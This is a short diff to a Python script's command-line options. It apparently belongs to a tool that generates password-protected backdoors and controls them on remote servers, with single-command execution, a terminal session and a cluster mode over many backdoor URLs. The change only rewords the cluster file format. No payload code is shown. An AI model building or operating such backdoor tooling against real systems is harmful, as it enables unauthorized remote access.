@@ -31,7 +31,7 @@ if __name__ == "__main__":
 	opt.add_option( "-o", "--output",   action="store",	     dest="output",   default=None,  help="Output filename for generated backdoor ." )
 	opt.add_option( "-c", "--command",  action="store", 	 dest="command",  default=None,  help="Execute a single command and exit, requires -u and -p ." )
 	opt.add_option( "-t", "--terminal", action="store_true", dest="terminal", default=False, help="Start a terminal-like session, requires -u and -p ." )
-	opt.add_option( "-C", "--cluster",  action="store", 	 dest="cluster",  default=None,  help="Start in cluster mode reading items from the give file, in the form 'url,password'." )
+	opt.add_option( "-C", "--cluster",  action="store", 	 dest="cluster",  default=None,  help="Start in cluster mode reading items from the give file, in the form 'label,url,password' where label is optional." )
 	opt.add_option( "-p", "--password", action="store", 	 dest="password", default=None,  help="Password of the encrypted backdoor ." )
 	opt.add_option( "-u", "--url",   	action="store", 	 dest="url", 	  default=None,  help="Remote backdoor URL ." )
 
